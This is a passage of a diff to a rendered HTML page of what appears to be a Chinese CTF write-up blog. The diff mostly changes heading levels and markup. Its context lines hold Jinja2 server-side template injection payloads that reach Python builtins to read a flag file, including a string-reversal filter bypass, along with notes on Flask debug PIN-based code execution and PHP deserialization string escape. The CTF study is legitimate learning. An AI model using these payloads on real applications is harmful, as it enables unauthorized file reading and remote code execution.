class=&#34;s1&#34;&gt;&amp;#39;/this_is_the_fl&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ag.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()}}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;endif&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;endfor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;读取flag二字符倒序输出&#34;&gt;读取flag二：字符倒序输出&lt;/h3&gt;
+&lt;/div&gt;&lt;h4 id=&#34;读取flag二字符倒序输出&#34;&gt;读取flag二：字符倒序输出&lt;/h4&gt;
 &lt;p&gt;      除了这种字符串拼接，大佬还出了一个骚姿势：&lt;code&gt;通过txt.galf_eht_si_siht/[::-1]将字符倒序输出&lt;/code&gt;。&lt;/p&gt;
 &lt;p&gt;payload：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -16596,7 +15607,7 @@ Method: GET&lt;/p&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__class__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__base__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__subclasses__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;catch_warnings&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}{{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__globals__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;txt.galf_eht_si_siht/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[::&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()}}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;endif&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;endfor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;解二pin码rce&#34;&gt;解二：PIN码RCE&lt;/h2&gt;
+&lt;/div&gt;&lt;h3 id=&#34;解二pin码rce&#34;&gt;解二：PIN码RCE&lt;/h3&gt;
 &lt;p&gt;      尽管我已经被大佬的姿势骚断了腿，预期解的思路还是要学一下：&lt;code&gt;通过计算PIN码值调用python shell实现RCE&lt;/code&gt;。&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/HacTF/p/8160076.html&#34;&gt;Flask debug 模式 PIN 码生成机制安全性研究笔记&lt;/a&gt;一文中详细论述了PIN码的生成条件及方法。&lt;/p&gt;
 &lt;p&gt;总结如下：&lt;/p&gt;
@@ -16739,7 +15750,7 @@ Method: GET&lt;/p&gt;
 &lt;span class=&#34;c1&#34;&gt;# 这里使用popen的原因是system不会产生回显&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;ciscn2019-总决赛-day1-web3flask-message-board----综合&#34;&gt;[CISCN2019 总决赛 Day1 Web3]Flask Message Board -- 综合&lt;/h1&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ciscn2019-总决赛-day1-web3flask-message-board&#34;&gt;[CISCN2019 总决赛 Day1 Web3]Flask Message Board&lt;/h2&gt;
 &lt;p&gt;      站点有三个输入框，分别是&lt;code&gt;Title&lt;/code&gt;、&lt;code&gt;Author&lt;/code&gt;、&lt;code&gt;Content&lt;/code&gt;，测试SSTI，在&lt;code&gt;Author&lt;/code&gt;处存在SSTI，并在Info框中回显(本身的框中也会回显，但是Info框&lt;strong&gt;好看&lt;/strong&gt;)，输入时抓包解密session得&lt;code&gt;{&amp;quot;admin&amp;quot;:false,&amp;quot;name&amp;quot;:&amp;quot;{{1+1}}&amp;quot;}&lt;/code&gt;。&lt;/p&gt;
 &lt;p&gt;      思路应该是SSTI得到SECRET_KEY伪造session登录admin，然后在输入&#39;{{1*1}}&#39;时回显&lt;code&gt;reject because You are: Bot or hacker&lt;/code&gt;说明存在waf，fuzz一下，结果出了问题：&lt;/p&gt;
 &lt;blockquote&gt;
@@ -17296,10 +16307,10 @@ Todo: add /admin/model_download button  下载模型&lt;/p&gt;
 &lt;h2 id=&#34;字符逃逸&#34;&gt;字符逃逸&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;大佬文章：&lt;a href=&#34;https://my.oschina.net/u/3076320/blog/4372683&#34;&gt;PHP反序列化字符串逃逸&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;我的理解：
-      字符逃逸基于&lt;code&gt;PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容&lt;/code&gt;的特点。
-      在拥有某种&lt;strong&gt;能够在代码执行过程中改变字符串长度的方法&lt;/strong&gt;后，我们输入字符串的长度会成为序列化字符串中变量值的&lt;code&gt;长度属性&lt;/code&gt;(&lt;u&gt;长度属性决定反序列化时提取的字符串长度&lt;/u&gt;)，而代码执行过程中字符串长度变化并不会改变该字符串长度属性，这种&lt;strong&gt;实际长度上的变化与长度属性的差值就是字符逃逸的关键&lt;/strong&gt;，通过长度差我们可以&lt;u&gt;构造新变量or覆盖变量&lt;/u&gt;。
-      注意，构造payload时必须闭合前面的&lt;code&gt;&amp;quot;&lt;/code&gt;，这是由于左右两边的&lt;code&gt;&amp;quot;&lt;/code&gt;只要处于闭合状态，中间任何非&lt;code&gt;&amp;quot;&lt;/code&gt;的字符都会被当成字符串作为变量值，不具有其他作用。&lt;/p&gt;
+&lt;p&gt;我的理解：&lt;/p&gt;
+&lt;p&gt;字符逃逸基于&lt;code&gt;PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容&lt;/code&gt;的特点。&lt;/p&gt;
+&lt;p&gt;在拥有某种&lt;strong&gt;能够在代码执行过程中改变字符串长度的方法&lt;/strong&gt;后，我们输入字符串的长度会成为序列化字符串中变量值的&lt;code&gt;长度属性&lt;/code&gt;(&lt;u&gt;长度属性决定反序列化时提取的字符串长度&lt;/u&gt;)，而代码执行过程中字符串长度变化并不会改变该字符串长度属性，这种&lt;strong&gt;实际长度上的变化与长度属性的差值就是字符逃逸的关键&lt;/strong&gt;，通过长度差我们可以&lt;u&gt;构造新变量or覆盖变量&lt;/u&gt;。&lt;/p&gt;
+&lt;p&gt;注意，构造payload时必须闭合前面的&lt;code&gt;&amp;quot;&lt;/code&gt;，这是由于左右两边的&lt;code&gt;&amp;quot;&lt;/code&gt;只要处于闭合状态，中间任何非&lt;code&gt;&amp;quot;&lt;/code&gt;的字符都会被当成字符串作为变量值，不具有其他作用。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;解题过程&#34;&gt;解题过程&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
